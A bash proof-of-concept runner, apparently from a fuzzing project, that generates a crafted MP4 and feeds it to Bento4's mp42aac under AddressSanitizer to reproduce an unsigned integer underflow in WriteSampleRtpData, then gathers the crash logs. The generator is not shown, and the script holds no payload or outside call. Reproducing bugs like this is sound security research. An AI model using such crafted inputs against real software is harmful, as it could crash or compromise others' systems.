#!/usr/bin/env bash
# PoC runner for VULN 003 – Unsigned Integer Underflow in WriteSampleRtpData
# File: Ap4HintTrackReader.h (Ap4HintTrackReader.cpp) line 331

set -e

POC_DIR="/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4HintTrackReader_h"
MP4_FILE="$POC_DIR/vuln_003.mp4"
RESULT_FILE="$POC_DIR/vuln_003_result.txt"
ASAN_LOG_PATH="$POC_DIR/asan.log"
BINARY="/data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac"

echo "[*] Step 1: Generating crafted MP4..."
python3 "$POC_DIR/vuln_003_gen.py"

echo "[*] Step 2: Running mp42aac under ASAN..."
ASAN_OPTIONS="abort_on_error=0:log_path=${ASAN_LOG_PATH}" \
  "$BINARY" \
  "$MP4_FILE" \
  /dev/null \
  > "$RESULT_FILE" 2>&1 || true

echo "[*] Step 3: Collecting ASAN output..."
for f in "${ASAN_LOG_PATH}".*; do
    if [ -f "$f" ]; then
        echo "=== ASAN log: $f ===" >> "$RESULT_FILE"
        cat "$f" >> "$RESULT_FILE"
    fi
done

# Also check log without PID suffix
if [ -f "${ASAN_LOG_PATH}" ]; then
    echo "=== ASAN log: ${ASAN_LOG_PATH} ===" >> "$RESULT_FILE"
    cat "${ASAN_LOG_PATH}" >> "$RESULT_FILE"
fi

echo "[*] Done. Results in: $RESULT_FILE"
cat "$RESULT_FILE"
